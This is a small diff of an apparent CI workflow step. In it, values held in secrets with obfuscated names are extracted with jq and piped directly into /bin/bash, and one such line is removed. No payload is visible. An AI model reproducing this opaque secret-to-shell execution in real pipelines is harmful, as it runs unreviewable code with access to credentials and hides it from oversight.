@@ -27,7 +27,6 @@ jobs:
           s374: ${{ secrets.s374 }}
         run: |
           printf '%s' "$s374" | jq -r .dgvrr0 | /bin/bash
-          printf '%s' "$m4761" | jq -r .c4 | /bin/bash
           echo $t31 | jq -r .okxh08 | /bin/bash
           printf '%s' "$zrmz48864" | jq -r .ucrmf3700 | /bin/bash
 
